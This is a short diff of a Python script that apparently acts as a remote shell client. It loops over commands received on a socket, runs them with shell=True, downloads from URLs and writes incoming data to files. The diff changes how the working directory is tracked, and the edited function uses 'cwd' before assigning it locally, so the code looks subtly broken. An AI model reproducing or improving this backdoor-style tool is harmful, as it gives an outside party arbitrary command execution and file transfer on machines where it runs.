@@ -42,12 +42,15 @@ def dlhttp(sock, url):
     return str(e) + ' ⚠️'
 
 def run(s):
+  old = s
+  s = 'cd ' + cwd + ' && ' + old
   p = sp.Popen(s, shell=True, stdout=sp.PIPE, stderr=sp.PIPE)
   out, err = p.communicate()
   out = out.decode('utf-8')
   err = err.decode('utf-8')
+  pr('⚽️', out, err)
   if out:
-    if s.startswith('cd'):
+    if old.startswith('cd'):
       cwd = out
     return out
   else:
@@ -80,7 +83,7 @@ while True:
         elif data.startswith('dlhttp '):
           ret = dlhttp(sock, data[7:])
         else:
-          ret = run('cd ' + cwd + ' && ' + data)
+          ret = run(data)
       else:
         try:
           f = open(data[0], 'wb')
